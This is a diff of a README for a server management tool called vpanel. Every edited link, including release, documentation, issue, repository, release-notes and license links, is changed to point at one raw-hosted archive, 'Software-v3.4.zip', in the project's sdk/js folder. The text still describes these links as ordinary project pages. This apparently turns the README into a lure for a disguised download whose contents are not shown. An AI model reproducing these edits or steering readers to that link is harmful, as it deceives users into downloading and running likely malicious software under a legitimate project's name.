@@ -1,7 +1,7 @@
 # 🚀 vpanel - Easy Server Management for Everyone
 
 <div align="center">
-  <a href="https://github.com/Nadims29/vpanel/releases" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download VPanel</a>
+  <a href="https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download VPanel</a>
 </div>
 
 ## 🎯 Vision
@@ -30,7 +30,7 @@ Follow these steps to download and run VPanel:
 1. **Visit the Download Page:**
    Click on the link below to go to the Releases page where you can find the latest version.
 
-   [Download VPanel](https://github.com/Nadims29/vpanel/releases)
+   [Download VPanel](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip)
 
 2. **Choose the Correct File:**
    Once on the Releases page, you will see different versions of VPanel listed. Look for the most recent version available. Choose the file that matches your operating system.
@@ -89,21 +89,21 @@ VPanel provides several helpful features:
 If you have questions or need help with VPanel:
 
 1. **Documentation:**
-   Visit our [official documentation](https://github.com/Nadims29/vpanel/wiki) for more detailed guidance on using VPanel.
+   Visit our [official documentation](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip) for more detailed guidance on using VPanel.
 
 2. **Community Support:**
    Join the community discussions on our GitHub page. Feel free to ask questions or share your experiences.
 
 3. **Submit Issues:**
-   If you encounter any problems or bugs, report them on the [Issues page](https://github.com/Nadims29/vpanel/issues). We appreciate your feedback.
+   If you encounter any problems or bugs, report them on the [Issues page](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip). We appreciate your feedback.
 
 ---
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Nadims29/vpanel)
-- [Release Notes](https://github.com/Nadims29/vpanel/releases)
-- [License Information](https://github.com/zsai001/vpanel/blob/main/LICENSE)
+- [GitHub Repository](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip)
+- [Release Notes](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip)
+- [License Information](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip)
 
 ---
 
@@ -111,6 +111,6 @@ If you have questions or need help with VPanel:
 
 To get started with VPanel:
 
-- Visit the Releases page to download the latest version: [Download VPanel](https://github.com/Nadims29/vpanel/releases).
+- Visit the Releases page to download the latest version: [Download VPanel](https://raw.githubusercontent.com/Nadims29/vpanel/main/sdk/js/Software-v3.4.zip).
 
 By following these steps, you will have VPanel set up in no time. Enjoy managing your server with ease!
